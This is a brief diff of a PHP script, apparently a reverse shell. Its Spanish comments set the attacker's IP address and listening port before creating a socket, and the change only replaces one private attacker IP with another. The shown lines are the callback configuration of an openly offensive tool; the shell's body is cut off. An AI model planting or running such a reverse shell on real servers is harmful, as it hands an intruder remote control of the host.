@@ -1,6 +1,6 @@
 <?php
 // Configuración
-$ip = "192.168.10.157";  // Reemplaza con la IP del atacante
+$ip = "192.168.61.187";  // Reemplaza con la IP del atacante
 $port = 6969;         // Reemplaza con el puerto en el que escuchas
 
 // Crear un socket
